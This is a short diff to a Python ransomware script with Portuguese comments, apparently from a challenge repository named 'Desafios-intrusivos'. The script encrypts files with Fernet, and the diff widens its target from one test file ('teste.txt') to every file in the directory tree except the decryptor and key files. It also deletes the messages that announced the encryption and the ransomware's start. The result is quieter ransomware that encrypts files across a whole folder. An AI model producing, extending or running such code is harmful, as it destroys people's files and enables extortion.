@@ -16,7 +16,6 @@ def carregar_chave():
 
 #3. Criptografar um único arquivo
 def criptografar_arquivo(arquivo, chave):
-    print(f"Criptografando arquivo: {arquivo}")
     f = Fernet(chave)
     with open(arquivo, "rb") as file:
         dados = file.read()
@@ -31,7 +30,7 @@ def encontrar_arquivos(diretorio):
     for raiz, _, arquivos in os.walk(diretorio):
         for nome in arquivos:
             caminho = os.path.join(raiz, nome)
-            if nome =="teste.txt":
+            if nome != "Descriptografar.py" and not nome.endswith(".key"):
                 lista.append(caminho)
     print(lista)
     return lista
@@ -46,7 +45,6 @@ def criar_mensagem_restage():
 
 #6. Execução principal
 def main():
-    print("Iniciando ransomware...")
     gerar_chave()
     chave = carregar_chave()
     arquivos = encontrar_arquivos("/workspaces/Desafios-intrusivos")
